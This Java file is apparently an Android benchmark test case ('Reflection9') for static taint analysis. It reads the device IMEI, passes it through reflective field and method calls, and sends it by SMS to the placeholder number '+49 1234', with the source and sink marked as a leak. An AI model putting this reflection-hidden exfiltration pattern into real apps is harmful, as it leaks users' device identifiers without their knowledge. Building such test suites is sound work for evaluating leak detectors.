package lu.uni.snt.reflection9;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.Menu;

/**
 * @testcase_name Reflection9
 * @version 0.1
 * @author SnT, University of Luxembourg 
 * @author_mail li.li@uni.lu
 * 
 * @description A class instance is created using reflection (ClassLoader.loadClass()). 
 * Sensitive data is stored in a field through reflection call (f.set) of this class and 
 * then read out through reflection call (a getter method) again and leaked.
 * @dataflow onCreate: source -> bc.imei -> sink
 * @number_of_leaks 1
 * @challenges The analysis must be able to handle reflective class instantiations.
 */
public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		
		try {
			TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
			String deviceId = telephonyManager.getDeviceId(); //source
			
			Class<?> c = this.getClassLoader().loadClass("lu.uni.snt.reflection9.ConcreteClass");
			Object o =  c.newInstance();
			
			Field f = c.getField("imei");
			f.set(o, deviceId);
			
			Method m = c.getMethod("getImei", new Class[] {});
			String imei = (String) m.invoke(o, new Object[] {});
			
			SmsManager sms = SmsManager.getDefault();
	        sms.sendTextMessage("+49 1234", null, imei, null, null);   //sink, leak
		} catch (InstantiationException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IllegalAccessException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (ClassNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (NoSuchFieldException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (NoSuchMethodException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IllegalArgumentException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (InvocationTargetException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}
